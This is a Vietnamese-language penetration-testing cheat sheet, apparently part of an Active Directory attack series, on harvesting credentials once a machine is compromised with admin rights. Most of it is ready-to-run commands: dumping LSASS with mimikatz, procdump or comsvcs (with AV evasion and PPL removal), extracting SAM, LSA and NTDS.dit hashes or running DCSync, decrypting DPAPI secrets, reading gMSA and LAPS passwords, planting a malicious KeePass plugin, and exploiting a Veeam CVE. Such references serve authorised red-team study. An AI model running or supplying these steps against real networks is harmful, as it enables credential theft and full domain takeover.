# 07 — Credentials Harvesting (dump credential khi là Admin)

**Trạng thái:** **Admin/SYSTEM** trên một máy. **Mục tiêu:** lấy thêm
credential/hash/ticket để lan ngang và tiến tới DA. Mỗi credential mới → quay lại
[file 03](03-valid-credentials-enum.md).

---

## A. LSASS (user đang/đã đăng nhập: mật khẩu, hash, ticket)

> **Khi nào:** là admin local, có user khác đã login (box "Extract credentials
> from LSASS.exe").
> **Tại sao:** LSASS giữ secret của mọi phiên → lấy mật khẩu/NT hash/AES/ticket.

```powershell
# mimikatz
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
mimikatz "privilege::debug" "sekurlsa::tickets /export"        # xuất ticket
# Dump file rồi phân tích offline (né AV)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\lsass.dmp full
PPLdump64.exe <lsass.exe|lsass_pid>                             # nếu LSASS là Protected Process (PPL)
```

```bash
# Từ xa / phân tích offline
nxc smb <ip_range> -u <user> -p <password> -M lsassy
lsassy -d <domain> -u <user> -p <password> <ip>
pypykatz lsa minidump lsass.dmp
```

- **Kết quả:** box **"User + Pass"** / **"NT Hash"** / **"Kerberos TGT/TGS"**.
- **LSASS as protected process (PPL):** mindmap đưa lệnh bật/tắt bảo vệ qua
  mimikatz driver:
  ```
  mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe" "!-"
  ```

---

## B. SAM (hash local) + LSA secrets

> **Khi nào:** admin local. Box "Extract credentials from SAM / LSA".
> **Tại sao:** hash local Administrator thường dùng lại nhiều máy → PtH.

```bash
secretsdump.py '<domain>/<user>:<pass>'@<ip>                    # SAM + LSA + cached
nxc smb <ip_range> -u <user> -p <password> --sam
nxc smb <ip_range> -u <user> -p <password> --lsa
```

```powershell
reg save HKLM\SAM <file>; reg save HKLM\SYSTEM <file>
reg save HKLM\SECURITY <file>
mimikatz "privilege::debug" "lsadump::sam" "exit"
mimikatz "privilege::debug" "lsadump::lsa" "exit"
# offline:
secretsdump.py -system SYSTEM -sam SAM LOCAL
secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
```

- **Kết quả:** box **"NTLM"** (hash local) → PtH; LSA cho mật khẩu service/autologon.

### MSCache 2 (cached domain creds — DCC2)

> **Khi nào:** máy từng có domain user đăng nhập, DC offline.
> **Tại sao:** hash DCC2 **không PtH được**, chỉ crack offline (rất chậm).

```bash
# nằm trong output secretsdump; crack:
hashcat -m 2100 -a 0 hash.txt rockyou.txt
```

---

## C. DPAPI (mật khẩu trình duyệt, Wi-Fi, credential manager, RDP)

> **Khi nào:** admin/SYSTEM hoặc có masterkey của user.
> **Tại sao:** nhiều secret người dùng mã hoá bằng DPAPI → giải mã lấy creds.

```bash
donpapi collect -H ':<hash>' <domain>/<user>@<ip_range>
donpapi <domain>/<user>:<password>@<target>
dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>
dpapidump.py <domain>/<user>:<password>@<target>
```

```powershell
mimikatz "sekurlsa::dpapi"
SharpDPAPI.exe triage
# Crack masterkey user offline:
DPAPImk2john.py -c domain -mk <masterkey> -S <sid> --preferred <prefered_file>
```

- **Kết quả:** box **"User + Pass" / "Credentials"**.

---

## D. NTDS.dit (toàn bộ hash domain — khi đã là DA / có quyền replication)

> **Khi nào:** admin trên DC, hoặc có DCSync right. Box "Dump ntds.dit".
> **Tại sao:** lấy `krbtgt` + mọi hash domain → Golden ticket, PtH DA.

```bash
# DCSync từ xa (không lên DC)
nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds
secretsdump.py '<domain>/<user>:<password>'@<ip> -just-dc
certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>   # DCSync qua ADCS (không cần DA)
```

```powershell
# Trên DC: tạo IFM/VSS
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
vssadmin list shadows
# rồi offline:
secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```

- **Kết quả:** toàn bộ `user:rid:lm:nt:::` → [file 12](12-domain-admin-persistence.md).

---

## E. gMSA (Group Managed Service Account)

> **Khi nào:** nằm trong `PrincipalsAllowedToRetrieveManagedPassword`
> (edge ReadGMSAPassword).

```bash
nxc ldap <ip> -u <user> -p <pass> --gmsa
gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'
ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa
```

- **Kết quả:** NT hash tài khoản gMSA → PtH / Silver ticket.

---

## F. LAPS (mật khẩu admin local ngẫu nhiên)

> **Khi nào:** có edge ReadLAPSPassword.

```bash
nxc ldap <dc_ip> -u '<user>' -p '<password>' --module laps
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps
msf> use post/windows/gather/credentials/enum_laps        # ⚠️ msf
```

```powershell
Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
```

```cypher
MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p   # ai đọc được LAPS
```

- **Kết quả:** mật khẩu local admin máy đó → `--local-auth`.

---

## G. KeePass / Veeam / các kho bí mật khác

```bash
# KeePass: cấy plugin độc để trích DB khi user mở
KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll
KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>
# Veeam (CVE-2023-27532): lấy credential lưu trong Veeam
VeeamHax.exe --target <veeam_server>
```

- **Kết quả:** box **"Extract Keepass" / "User + Pass"**.

---

## Checklist Credentials Harvesting

- [ ] LSASS (lsassy/pypykatz) — user đang login?
- [ ] SAM + LSA → hash local → PtH
- [ ] DPAPI (donpapi/dploot)
- [ ] DCC2 (crack `-m 2100`)
- [ ] gMSA / LAPS nếu có quyền đọc
- [ ] Trên DC → NTDS.dit / DCSync → file 12
- [ ] Mọi creds mới → file 03 + lan ngang (file 08)
